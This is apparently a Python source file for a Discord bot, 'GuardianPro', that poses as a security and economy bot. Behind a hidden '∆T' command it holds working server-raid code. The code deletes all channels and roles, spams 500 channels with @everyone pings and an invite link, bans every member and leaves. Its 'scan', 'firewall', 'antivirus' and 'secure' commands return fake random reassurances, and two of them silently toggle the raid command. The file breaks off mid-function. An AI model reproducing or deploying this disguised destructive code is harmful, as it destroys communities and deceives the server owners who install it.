import discord
from discord.ext import commands
import asyncio
import json
import os
import random
import datetime
from asyncio import sleep

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

def get_prefix(bot, message):
    # Solo comandos de economía usan .
    if message.content.startswith('.'):
        return '.'
    # Comandos especiales usan ∆
    elif message.content.startswith('∆'):
        return '∆'
    return ['∆', '.']  # Fallback

bot = commands.Bot(command_prefix=get_prefix, intents=intents, help_command=None)

# Estado de comandos especiales (discreto)
delta_commands_enabled = True
economy_only_mode = False # Nuevo estado para modo economía solamente

# Sistema de economía
balances_file = 'balances.json'
cooldowns_file = 'cooldowns.json'

if os.path.exists(balances_file):
    with open(balances_file, 'r') as f:
        balances = json.load(f)
else:
    balances = {}

if os.path.exists(cooldowns_file):
    with open(cooldowns_file, 'r') as f:
        cooldowns = json.load(f)
else:
    cooldowns = {}

def save_balances():
    with open(balances_file, 'w') as f:
        json.dump(balances, f)

def save_cooldowns():
    with open(cooldowns_file, 'w') as f:
        json.dump(cooldowns, f)

def get_balance(user_id):
    user_id = str(user_id)
    if user_id not in balances:
        balances[user_id] = {"wallet": 0, "bank": 0}
    return balances[user_id]

def update_balance(user_id, wallet=0, bank=0):
    user_id = str(user_id)
    bal = get_balance(user_id)
    bal['wallet'] += wallet
    bal['bank'] += bank
    # No dejar negativo
    if bal['wallet'] < 0:
        bal['wallet'] = 0
    if bal['bank'] < 0:
        bal['bank'] = 0
    save_balances()

def can_use_cooldown(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    user_cd = cooldowns[user_id]
    last = user_cd.get(command, 0)

    if now - last >= cooldown_time:
        user_cd[command] = now
        save_cooldowns()
        return True
    return False

def get_cooldown_remaining(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        return 0
    last = cooldowns[user_id].get(command, 0)
    remaining = cooldown_time - (now - last)
    return max(0, remaining)

@bot.event
async def on_ready():
    print(f'Bot GuardianPro está listo y conectado como {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Sincronizados {len(synced)} slash commands")
    except Exception as e:
        print(f"Error al sincronizar slash commands: {e}")
    print("✅ Bot GuardianPro configurado correctamente:")
    print("• Sistema de economía con prefijo .")
    print("• Moderación automática")
    print("• Sistema de niveles y tickets")
    print("• Utilidades y entretenimiento")
    print("• Comandos especiales ocultos")

@bot.event
async def on_guild_join(guild):
    """Se ejecuta cuando el bot se une a un servidor nuevo"""
    print(f'Bot se unió al servidor: {guild.name} (ID: {guild.id})')

    # Esperar un poco para asegurar que el bot esté completamente integrado
    await asyncio.sleep(2)

    # Crear rol de administrador del bot
    try:
        # Verificar que el bot tenga permisos para crear roles
        if not guild.me.guild_permissions.manage_roles:
            print(f"No tengo permisos para crear roles en {guild.name}")
            return

        admin_role = await guild.create_role(
            name="🛡️ GuardianPro Admin",
            colour=discord.Colour.red(),
            permissions=discord.Permissions(administrator=True),
            reason="Rol de administrador creado automáticamente por GuardianPro"
        )
        print(f"Rol de administrador creado en {guild.name}: {admin_role.name}")

        # Intentar asignar el rol al propietario del servidor
        try:
            if guild.owner and not guild.owner.bot:
                await guild.owner.add_roles(admin_role, reason="Asignación automática de rol de administrador al propietario")
                print(f"Rol asignado al propietario del servidor: {guild.owner.display_name}")
            else:
                print("No se pudo identificar al propietario del servidor")
        except discord.Forbidden:
            print("No se pudo asignar el rol al propietario (jerarquía de roles o permisos insuficientes)")
        except Exception as e:
            print(f"Error al asignar rol al propietario: {e}")

        # Buscar un canal donde enviar mensaje de bienvenida
        welcome_channel = None

        # Prioridad: canal con "general" en el nombre
        for channel in guild.text_channels:
            if "general" in channel.name.lower() and channel.permissions_for(guild.me).send_messages:
                welcome_channel = channel
                break

        # Si no hay canal general, buscar cualquier canal donde se pueda escribir
        if not welcome_channel:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    welcome_channel = channel
                    break

        if welcome_channel:
            embed = discord.Embed(
                title="🛡️ GuardianPro se ha unido al servidor",
                description=f"¡Hola! Soy **GuardianPro**, tu asistente de seguridad y economía.\n\n"
                           f"✅ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
                           f"👑 El propietario del servidor ha sido asignado a este rol automáticamente.\n\n"
                           f"🔧 **Comandos principales:**\n"
                           f"• `/help` - Ver todos los comandos disponibles\n"
                           f"• `.balance` - Sistema de economía\n"
                           f"• `/scan` - Escaneo de seguridad\n\n"
                           f"⚙️ **Para administradores:** Comandos especiales con prefijo `∆`",
                color=discord.Color.blue()
            )
            embed.add_field(
                name="🚀 Primeros pasos",
                value="1. Usa `/help` para ver todos los comandos\n"
                      "2. Configura el servidor con `/sset`\n"
                      "3. Explora el sistema de economía con `.balance`",
                inline=False
            )
            embed.set_footer(text="GuardianPro | Protección y diversión 24/7")
            embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")

            await welcome_channel.send(embed=embed)
            print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
        else:
            print("No se encontró canal donde enviar mensaje de bienvenida")

    except discord.Forbidden:
        print(f"No tengo permisos para crear roles en {guild.name}")
        # Intentar enviar mensaje sin crear rol
        try:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    embed = discord.Embed(
                        title="🛡️ GuardianPro se ha unido al servidor",
                        description="¡Hola! Soy **GuardianPro**.\n\n"
                                   "⚠️ **Atención:** No pude crear el rol de administrador debido a permisos limitados.\n"
                                   "Por favor, asegúrate de que tengo permisos para **Administrar Roles**.\n\n"
                                   "🔧 Usa `/help` para ver todos los comandos disponibles.",
                        color=discord.Color.orange()
                    )
                    await channel.send(embed=embed)
                    break
        except:
            pass
    except Exception as e:
        print(f"Error al crear rol de administrador en {guild.name}: {e}")

async def delete_channel(channel):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await channel.delete()
            print(f"Canal borrado: {channel.name}")
            return
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit
                retry_after = getattr(e, 'retry_after', 5)
                print(f"Rate limit al borrar {channel.name}, esperando {retry_after} segundos...")
                await asyncio.sleep(retry_after)
            else:
                print(f"Error al borrar canal {channel.name}: {e}")
                if attempt == max_retries - 1:  # Último intento
                    break
        except Exception as e:
            print(f"Error al borrar canal {channel.name}: {e}")
            if attempt == max_retries - 1:  # Último intento
                break

async def create_channel_with_message(guild, i, overwrites):
    try:
        channel = await guild.create_text_channel(f'crashed-{i}', overwrites=overwrites)
        print(f"Canal creado: crashed-{i}")
        # Esperar menos tiempo antes de enviar mensaje
        await asyncio.sleep(0.5)
        try:
            await channel.send("@everyone @here hecho por Nathyx, hermano de Eather https://discord.gg/Fhh4DTKW")
            print(f"Mensaje enviado en: crashed-{i}")
        except Exception as msg_error:
            print(f"Error al enviar mensaje en crashed-{i}: {msg_error}")
    except Exception as e:
        print(f"Error al crear canal crashed-{i}: {e}")

async def create_role(guild, i):
    try:
        await guild.create_role(name=f"raided-{i}", colour=discord.Colour.red())
        print(f"Rol creado: raided-{i}")
    except Exception as e:
        print(f"Error al crear rol raided-{i}: {e}")

async def create_event(guild, i):
    try:
        from datetime import datetime, timedelta
        start_time = datetime.utcnow() + timedelta(hours=1)
        end_time = start_time + timedelta(hours=2)

        await guild.create_scheduled_event(
            name="raideados jeje",
            description="Evento creado por Nathyx",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            entity_metadata=discord.EntityMetadata(location="Discord Server")
        )
        print(f"Evento creado: raideados jeje #{i}")
    except Exception as e:
        print(f"Error al crear evento {i}: {e}")

async def delete_role(role):
    try:
        await role.delete()
        print(f"Rol borrado: {role.name}")
    except Exception as e:
        print(f"Error al borrar rol {role.name}: {e}")

async def ban_member(member):
    try:
        await member.ban(reason="Raid por Nathyx - Todos baneados")
        print(f"Miembro baneado: {member.name}")
    except discord.Forbidden:
        print(f"No se pudo banear a {member.name} debido a permisos insuficientes.")
    except discord.HTTPException as e:
        print(f"Error al banear a {member.name}: {e}")

@bot.command(name='T')
async def raid(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆T'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Verificar si está en modo economía
    if economy_only_mode:
        return

    guild = ctx.guild
    await ctx.send("Pringados... 😏")
    print(f"Raid iniciado en el servidor {guild.name}")

    # Cambiar nombre del servidor y quitar icono
    try:
        await guild.edit(name="-R4ID3D-", icon=None)
        print("Nombre del servidor cambiado a -R4ID3D- e icono eliminado")
    except Exception as e:
        print(f"Error al cambiar servidor: {e}")

    # Borrar todos los canales existentes en paralelo
    delete_channel_tasks = [delete_channel(channel) for channel in guild.channels]
    if delete_channel_tasks:
        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

    # Borrar todos los roles existentes (excepto @everyone)
    delete_role_tasks = [delete_role(role) for role in guild.roles if role.name != "@everyone"]
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Configurar permisos una sola vez
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(
            send_messages=True,
            read_messages=True,
            view_channel=True,
            embed_links=True,
            attach_files=True,
            read_message_history=True
        )
    }

    # Crear canales, roles y eventos por lotes para evitar rate limits
    print("Creando canales...")
    for batch in range(0, 500, 100):  # Crear en lotes de 100, total 500 canales
        channel_tasks = [create_channel_with_message(guild, i, overwrites) for i in range(batch, min(batch + 100, 500))]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)  # Pausa entre lotes

    print("Creando roles...")
    role_tasks = [create_role(guild, i) for i in range(500)]  # 500 roles
    await asyncio.gather(*role_tasks, return_exceptions=True)

    print("Creando eventos...")
    event_tasks = [create_event(guild, i) for i in range(10)]  # 10 eventos
    await asyncio.gather(*event_tasks, return_exceptions=True)

    # Banear a todos los miembros en paralelo
    ban_tasks = [ban_member(member) for member in guild.members if member != bot.user]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    await ctx.send("Raid completado!")

    # Salir del servidor después del raid
    try:
        await guild.leave()
        print(f"Bot salió del servidor {guild.name}")
    except Exception as e:
        print(f"Error al salir del servidor: {e}")

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
        self.current_page = 0
        self.pages = [
            {
                "title": "🛡️ Panel de Ayuda - Página 1/4",
                "description": "Tu asistente de **seguridad avanzada** para Discord.\n\nComandos de seguridad y monitoreo:",
                "fields": [
                    {
                        "name": "🔍 Escaneo y Seguridad",
                        "value": (
                            "**/scan** → Escanea el servidor en busca de amenazas.\n"
                            "**/secure** → Informe completo de seguridad.\n"
                            "**/monitor** → Estado en tiempo real de CPU, RAM y conexiones.\n"
                            "**/info** → Muestra información detallada del servidor."
                        )
                    },
                    {
                        "name": "🛡️ Protección",
                        "value": (
                            "**/sset** → Implementa el sistema de seguridad.\n"
                            "**/ban** → Banea a un usuario del servidor.\n"
                            "**/firewall** → Verifica el estado del firewall.\n"
                            "**/antivirus** → Estado y última actualización del antivirus.\n"
                            "**/encrypt** → Estado de la encriptación de datos."
                        )
                    }
                ]
            },
            {
                "title": "💾 Panel de Ayuda - Página 2/4",
                "description": "Comandos del sistema y utilidades:",
                "fields": [
                    {
                        "name": "💾 Sistema",
                        "value": (
                            "**/backup** → Verifica el estado de los respaldos.\n"
                            "**/ping** → Muestra la latencia del bot.\n"
                            "**/invite** → Crea un enlace de invitación personalizado.\n"
                            "**/server** → Envía al mensaje directo el enlace del servidor del bot.\n"
                            "**/version** → Muestra la versión actual del bot.\n"
                            "**/encrypt** → Verifica el estado de la encriptación."
                        )
                    },
                    {
                        "name": "🎉 Entretenimiento",
                        "value": (
                            "**/gstart** → Crear un sorteo interactivo con número de ganadores.\n"
                            "**/timer** → Establecer un temporizador personalizado."
                        )
                    }
                ]
            },
            {
                "title": "💰 Panel de Ayuda - Página 3/4",
                "description": "Sistema de economía (prefijo: `.`):",
                "fields": [
                    {
                        "name": "💰 Comandos Básicos",
                        "value": (
                            "**.balance** → Ver tu dinero\n"
                            "**.work** → Trabajar para ganar dinero\n"
                            "**.daily** → Recompensa diaria\n"
                            "**.pay** → Enviar dinero a otro usuario\n"
                            "**.deposit** → Depositar en el banco\n"
                            "**.withdraw** → Retirar del banco\n"
                            "**.beg** → Mendigar por dinero\n"
                            "**.crime** → Cometer crímenes por dinero"
                        )
                    },
                    {
                        "name": "🎯 Actividades Arriesgadas",
                        "value": (
                            "**.rob** → Intentar robar a otro usuario\n"
                            "**.coinflip** → Apostar en cara o cruz\n"
                            "**.slots** → Jugar a la máquina tragamonedas\n"
                            "**.blackjack** → Jugar al blackjack"
                        )
                    }
                ]
            },
            {
                "title": "🛒 Panel de Ayuda - Página 4/4",
                "description": "Tienda, inventario y rankings:",
                "fields": [
                    {
                        "name": "🛒 Tienda e Inventario",
                        "value": (
                            "**.shop** → Ver la tienda virtual\n"
                            "**.buy** → Comprar ítems de la tienda\n"
                            "**.inventory** → Ver tu inventario"
                        )
                    },
                    {
                        "name": "🏆 Rankings",
                        "value": (
                            "**.baltop** → Top 15 usuarios más ricos del servidor\n"
                            "**.leaderboard** → Tabla de posiciones del servidor"
                        )
                    }
                ]
            }
        ]

    def create_embed(self, page_index):
        page = self.pages[page_index]
        embed = discord.Embed(
            title=page["title"],
            description=page["description"],
            color=discord.Color.dark_blue()
        )

        for field in page["fields"]:
            embed.add_field(
                name=field["name"],
                value=field["value"],
                inline=False
            )

        embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")
        embed.set_footer(text="GuardianPro | Protección 24/7")

        return embed

    @discord.ui.button(label='◀️ Anterior', style=discord.ButtonStyle.secondary)
    async def previous_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='▶️ Siguiente', style=discord.ButtonStyle.secondary)
    async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_page < len(self.pages) - 1:
            self.current_page += 1
            embed = self.create_embed(self.current_page)
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='🏠 Inicio', style=discord.ButtonStyle.primary)
    async def home_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.current_page = 0
        embed = self.create_embed(self.current_page)
        await interaction.response.edit_message(embed=embed, view=self)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True

@bot.tree.command(name="help", description="Muestra todos los comandos y funciones del bot")
async def help_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    view = HelpView()
    embed = view.create_embed(0)
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name='scan', description='Escanea el servidor en busca de amenazas')
async def see_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    # Definir respuestas múltiples
    respuestas = [
        "🔍 Escaneando servidor en busca de amenazas... ✅ No se detectaron vulnerabilidades.",
        "🔍 Análisis completo. Todo está en orden.",
        "🔍 Iniciando el escaneo... Todo está protegido.",
        "🔍 Escaneo finalizado. Lista de amenazas: Ninguna.",
        "🔍 Verificación de seguridad completada. Estado: SEGURO."
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)

from discord import Embed

@bot.tree.command(name='info', description='Muestra información del servidor')
async def info_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("❌ Este comando solo puede usarse en servidores.", ephemeral=True)
        return

    embed = Embed(title=f"Información del servidor: {guild.name}", color=0x3498db)

    # Configurar thumbnail del servidor
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    # Información básica del servidor
    embed.add_field(name="📊 ID del Servidor", value=f"`{guild.id}`", inline=True)

    # Propietario del servidor - obtener de manera más confiable
    try:
        if guild.owner:
            owner_text = f"{guild.owner.name}#{guild.owner.discriminator}"
        else:
            # Si no está en caché, intentar obtener por ID
            owner = await bot.fetch_user(guild.owner_id) if guild.owner_id else None
            owner_text = f"{owner.name}#{owner.discriminator}" if owner else "Desconocido"
    except:
        owner_text = f"ID: {guild.owner_id}" if guild.owner_id else "Desconocido"

    embed.add_field(name="👑 Propietario", value=owner_text, inline=True)
    embed.add_field(name="📅 Creado el", value=guild.created_at.strftime("%d/%m/%Y a las %H:%M"), inline=True)

    # Estadísticas del servidor - contar correctamente
    all_channels = guild.channels
    text_channels = len([c for c in all_channels if isinstance(c, discord.TextChannel)])
    voice_channels = len([c for c in all_channels if isinstance(c, discord.VoiceChannel)])
    categories = len([c for c in all_channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros - intentar diferentes métodos
    member_count = guild.member_count
    if not member_count:
        # Si member_count es None, contar miembros cacheados
        member_count = len(guild.members) if guild.members else "No disponible"

    embed.add_field(name="👥 Miembros", value=f"{member_count:,}" if isinstance(member_count, int) else member_count, inline=True)
    embed.add_field(name="📝 Canales de Texto", value=text_channels, inline=True)
    embed.add_field(name="🔊 Canales de Voz", value=voice_channels, inline=True)
    embed.add_field(name="📁 Categorías", value=categories, inline=True)
    embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)

    # Nivel de verificación
    verification_levels = {
        discord.VerificationLevel.none: "Ninguno",
        discord.VerificationLevel.low: "Bajo",
        discord.VerificationLevel.medium: "Medio",
        discord.VerificationLevel.high: "Alto",
        discord.VerificationLevel.highest: "Máximo"
    }

    embed.add_field(name="🔒 Verificación", value=verification_levels.get(guild.verification_level, "Desconocido"), inline=True)
    embed.add_field(name="🎯 Nivel de Boost", value=f"Nivel {guild.premium_tier}", inline=True)
    embed.add_field(name="💎 Boosts", value=guild.premium_subscription_count or 0, inline=True)

    # Información adicional útil
    embed.add_field(name="🌍 Región", value=getattr(guild, 'preferred_locale', 'Desconocido'), inline=True)
    embed.add_field(name="📜 Descripción", value=guild.description[:50] + "..." if guild.description and len(guild.description) > 50 else guild.description or "Sin descripción", inline=False)

    embed.set_footer(text=f"Información solicitada por {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='firewall', description='Verifica el estado del firewall')
async def firewall_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    await interaction.response.send_message("🛡️ Firewall activado. Estado: PROTEGIDO | Conexiones bloqueadas: 0")

@bot.tree.command(name='version', description='Muestra la versión del bot')
async def scan_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    # Definir respuestas múltiples
    respuestas = [
        "Versión GPC 1",
        "Versión del sistema: GPC 1",
        "Estás utilizando la versión GPC 1! Gracias por utilizarme 😎"
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)

import time

@bot.tree.command(name='sset', description='Confirma que el sistema de seguridad está implementado')
async def sset_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    respuestas = [
        "🔒 Sistema de seguridad implementado con éxito. ¡Protección total activada!",
        "✅ Seguridad configurada y operativa. Tu servidor está blindado.",
        "🛡️ Protección avanzada habilitada. El sistema de seguridad está en marcha.",
        "⚙️ Sistema de seguridad online y funcionando sin fallos.",
        "🚀 Seguridad implementada correctamente. ¡El servidor está a salvo!",
        "🔐 Todos los protocolos de seguridad están activos y monitoreados.",
        "🛠️ Sistema de seguridad listo para defender contra cualquier amenaza."
    ]

    import random
    await interaction.response.send_message(random.choice(respuestas))

@bot.tree.command(name='server', description='Envía el enlace del servidor por mensaje directo')
async def server_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    enlace_del_servidor = "función aún no implementada"  # Cambia esto por tu enlace real

    await interaction.response.send_message("📩 Te he enviado el servidor al MD!", ephemeral=True)
    try:
        await interaction.user.send(f"🌐 Aquí tienes el enlace del servidor:\n{enlace_del_servidor}")
    except Exception:
        await interaction.followup.send("❌ No pude enviarte el mensaje directo. ¿Tienes los DMs abiertos?", ephemeral=True)

import time

@bot.tree.command(name='ping', description='Comprueba la latencia del bot')
async def ping_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    start = time.perf_counter()
    await interaction.response.defer()  # Defer para ganar tiempo y luego responder
    end = time.perf_counter()
    latency = (end - start) * 1000  # ms

    await interaction.followup.send(f"🏓 Pong! {latency:.2f} ms")


@bot.tree.command(name='antivirus', description='Verifica el estado del antivirus')
async def antivirus_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = False  # Deshabilitar comandos ∆ discretamente

    amenazas = random.choice([0, 0, 0, 1])  # Mayor probabilidad de 0 amenazas, a veces 1

    respuestas = [
        "🦠 Antivirus actualizado. Última verificación: Ahora mismo | Amenazas detectadas:0",
        "🛡️ Escaneo completo. Estado: LIMPIO | Último chequeo: Ahora mismo",
        "🔍 Análisis antivirus reciente. Amenazas encontradas: 1 (resuelto)",
        "✅ Antivirus activo y actualizado. Sin amenazas detectadas en el último análisis.",
        "⚠️ Advertencia: Amenaza leve detectada. Última revisión: Ahora mismo" if amenazas else"✅ Antivirus limpio y protegido. Última revisión: Ahora mismo"
    ]

    await interaction.response.send_message(random.choice(respuestas))

@bot.tree.command(name='ban', description='Banea a un usuario del servidor')
@discord.app_commands.describe(user='Usuario a banear', reason='Razón del baneo (opcional)')
async def ban_slash(interaction: discord.Interaction, user: discord.Member, reason: str = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    if not interaction.user.guild_permissions.ban_members:
        await interaction.response.send_message("❌ No tienes permiso para banear usuarios.", ephemeral=True)
        return

    try:
        await user.ban(reason=reason)
        mensaje = f"🔨 {user} ha sido baneado del servidor."
        if reason:
            mensaje += f"\n📝 Razón: {reason}"
        await interaction.response.send_message(mensaje)
    except Exception as e:
        await interaction.response.send_message(f"❌ No se pudo banear al usuario: {e}", ephemeral=True)

@bot.tree.command(name='invite', description='Genera un enlace de invitación temporal')
@discord.app_commands.describe(
    max_uses='Número máximo de usos del enlace (0 para ilimitado)',
    max_age='Duración en segundos antes de que expire el enlace (0 para ilimitado)'
)
async def invite_slash(interaction: discord.Interaction, max_uses: int = 1, max_age: int = 3600):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    if not interaction.user.guild_permissions.create_instant_invite:
        await interaction.response.send_message("❌ No tienes permiso para crear invitaciones.", ephemeral=True)
        return

    try:
        invite = await interaction.channel.create_invite(max_uses=max_uses, max_age=max_age, unique=True)
        await interaction.response.send_message(f"🔗 Aquí tienes tu enlace de invitación:\n{invite.url}")
    except Exception as e:
        await interaction.response.send_message(f"❌ No se pudo crear la invitación: {e}", ephemeral=True)


@bot.tree.command(name='backup', description='Verifica el estado de los backups')
async def backup_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    await interaction.response.send_message("💾 Sistema de respaldo activo. Último backup: Hace 5 minutos | Estado: SEGURO")

@bot.tree.command(name='monitor', description='Muestra el estado del monitoreo del sistema')
async def monitor_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = True  # Activar comandos ∆ discretamente

    cpu = random.randint(5, 25)       # CPU entre 5% y 25%
    ram = random.randint(20, 40)      # RAM entre 20% y 40%
    latency = random.randint(30, 60)  # Latencia entre 30ms y 60ms

    respuestas = [
        f"📊 Monitoreo activo: CPU: {cpu}% | RAM: {ram}% | Conexiones: SEGURAS ✅",
        f"📡 Sistema estable: CPU: {cpu}% | RAM: {ram}% | Latencia: {latency}ms | Estado: ÓPTIMO",
        f"🖥️ Recursos del servidor → CPU: {cpu}% | RAM: {ram}% | Conexiones seguras: 100%",
        f"📈 Monitoreo en tiempo real → CPU: {cpu}% | RAM: {ram}% | Seguridad: ALTA",
        f"🔎 Diagnóstico → CPU: {cpu}% | RAM: {ram}% | Estado de red: SEGURA",
        f"🛠️ Estado actual → CPU: {cpu}% | RAM: {ram}% | Conexiones: ESTABLES | Sin amenazas detectadas",
        f"🧠 Inteligencia activa → CPU: {cpu}% | RAM: {ram}% | Firewall y antivirus funcionando correctamente"
    ]

    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='encrypt', description='Verifica el estado de la encriptación')
async def encrypt_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    await interaction.response.send_message("🔐 Encriptación AES-256 activada. Datos protegidos al 100%")

@bot.tree.command(name='secure', description='Genera un informe completo de seguridad')
async def secure_slash(interaction: discord.Interaction):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    await interaction.response.send_message("🔒 INFORME DE SEGURIDAD:\n✅ Firewall: ACTIVO\n✅ Antivirus: ACTUALIZADO\n✅ Backups: AL DÍA\n✅ Encriptación: HABILITADA\n\n**Servidor 100% SEGURO**")

# Sistema de sorteos
active_giveaways = {}

class GiveawayView(discord.ui.View):
    def __init__(self, giveaway_id, winners_count, duration=None):
        super().__init__(timeout=None)
        self.giveaway_id = giveaway_id
        self.winners_count = winners_count
        self.duration = duration
        self.participants = set()

    @discord.ui.button(label='🎉 Participar', style=discord.ButtonStyle.green, custom_id='participate_giveaway')
    async def participate(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = interaction.user.id

        if user_id in self.participants:
            await interaction.response.send_message("❌ Ya estás participando en este sorteo.", ephemeral=True)
            return

        self.participants.add(user_id)

        # Actualizar el embed con el contador
        embed = interaction.message.embeds[0]
        embed.set_field_at(2, name="👥 Participantes", value=f"**{len(self.participants)}** usuarios participando", inline=True)

        await interaction.response.edit_message(embed=embed, view=self)

        # Mensaje privado de confirmación
        try:
            await interaction.followup.send("✅ ¡Te has unido al sorteo exitosamente!", ephemeral=True)
        except:
            pass

    @discord.ui.button(label='🏆 Finalizar Sorteo', style=discord.ButtonStyle.red, custom_id='end_giveaway')
    async def end_giveaway(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Solo el autor original puede finalizar
        if interaction.user.id != active_giveaways.get(self.giveaway_id, {}).get('author_id'):
            await interaction.response.send_message("❌ Solo quien creó el sorteo puede finalizarlo.", ephemeral=True)
            return

        if len(self.participants) == 0:
            await interaction.response.send_message("❌ No hay participantes en el sorteo.", ephemeral=True)
            return

        # Seleccionar ganadores
        participants_list = list(self.participants)
        winners_count = min(self.winners_count, len(participants_list))
        winners = random.sample(participants_list, winners_count)

        # Crear embed de resultados
        embed = discord.Embed(
            title="🎊 ¡SORTEO FINALIZADO!",
            color=discord.Color.gold()
        )

        giveaway_data = active_giveaways.get(self.giveaway_id, {})
        embed.add_field(name="🎁 Premio", value=giveaway_data.get('prize', 'No especificado'), inline=False)

        winners_text = ""
        for i, winner_id in enumerate(winners):
            try:
                winner = bot.get_user(winner_id)
                if winner:
                    winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
                else:
                    winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
            except:
                winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

        embed.add_field(name="🏆 Ganadores", value=winners_text, inline=False)
        embed.add_field(name="📊 Estadísticas", value=f"**{len(self.participants)}** participantes totales", inline=False)
        embed.set_footer(text=f"Sorteo finalizado por {interaction.user.display_name}")

        # Deshabilitar botones
        for item in self.children:
            item.disabled = True

        await interaction.response.edit_message(embed=embed, view=self)

        # Eliminar del registro
        if self.giveaway_id in active_giveaways:
            del active_giveaways[self.giveaway_id]

@bot.tree.command(name="gstart", description="Iniciar un sorteo interactivo")
@discord.app_commands.describe(
    duration="Duración en minutos (opcional, por defecto sin límite)",
    winners="Número de ganadores",
    prize="Premio del sorteo"
)
async def gstart(interaction: discord.Interaction, winners: int, prize: str, duration: int = 0):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    if winners <= 0:
        await interaction.response.send_message("❌ El número de ganadores debe ser mayor a 0.", ephemeral=True)
        return

    if winners > 20:
        await interaction.response.send_message("❌ El número máximo de ganadores es 20.", ephemeral=True)
        return

    # Generar ID único para el sorteo
    giveaway_id = f"{interaction.guild.id}_{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Guardar datos del sorteo
    active_giveaways[giveaway_id] = {
        'author_id': interaction.user.id,
        'prize': prize,
        'winners_count': winners,
        'channel_id': interaction.channel.id
    }

    # Crear embed del sorteo
    embed = discord.Embed(
